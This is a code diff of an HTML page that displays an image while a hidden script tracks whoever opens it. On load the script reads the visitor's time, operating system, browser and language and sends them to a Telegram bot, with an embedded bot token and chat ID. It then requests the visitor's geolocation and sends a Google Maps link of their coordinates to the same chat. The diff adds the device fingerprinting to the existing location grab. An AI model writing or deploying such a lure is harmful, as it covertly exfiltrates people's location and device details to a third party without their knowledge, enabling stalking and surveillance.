@@ -26,13 +26,30 @@
   <img src="ZRIDI.jpeg">
   <script>
     const now = new Date().toLocaleString("ar-SA", {timeZone: "Asia/Riyadh"});
-    fetch(`https://api.telegram.org/bot8708875898:AAGvKE4lTUOL87FYYft7V_INmR4t0k2Mf9Y/sendMessage?chat_id=1802530770&text=✅ شخص فتح الصورة!%0A⏰ ${now}`);
+    const ua = navigator.userAgent;
+    let os = "غير معروف";
+    let browser = "غير معروف";
+
+    if (/iPhone|iPad/.test(ua)) os = "iPhone/iPad";
+    else if (/Android/.test(ua)) os = "Android";
+    else if (/Windows/.test(ua)) os = "Windows";
+    else if (/Mac/.test(ua)) os = "Mac";
+
+    if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = "Chrome";
+    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = "Safari";
+    else if (/Firefox/.test(ua)) browser = "Firefox";
+    else if (/Edg/.test(ua)) browser = "Edge";
+
+    const lang = navigator.language || "غير معروف";
+
+    const msg = `✅ شخص فتح الصورة!%0A⏰ ${now}%0A📱 الجهاز: ${os}%0A🌐 المتصفح: ${browser}%0A🗣 اللغة: ${lang}`;
+    fetch(`https://api.telegram.org/bot8708875898:AAGvKE4lTUOL87FYYft7V_INmR4t0k2Mf9Y/sendMessage?chat_id=1802530770&text=${msg}`);
 
     navigator.geolocation.getCurrentPosition((pos) => {
       let lat = pos.coords.latitude;
       let lon = pos.coords.longitude;
-      const msg = `📍 موقعه!%0A🌐 https://www.google.com/maps?q=${lat},${lon}`;
-      fetch(`https://api.telegram.org/bot8708875898:AAGvKE4lTUOL87FYYft7V_INmR4t0k2Mf9Y/sendMessage?chat_id=1802530770&text=${msg}`);
+      const loc = `📍 موقعه!%0A🌐 https://www.google.com/maps?q=${lat},${lon}`;
+      fetch(`https://api.telegram.org/bot8708875898:AAGvKE4lTUOL87FYYft7V_INmR4t0k2Mf9Y/sendMessage?chat_id=1802530770&text=${loc}`);
     });
   </script>
 </body>
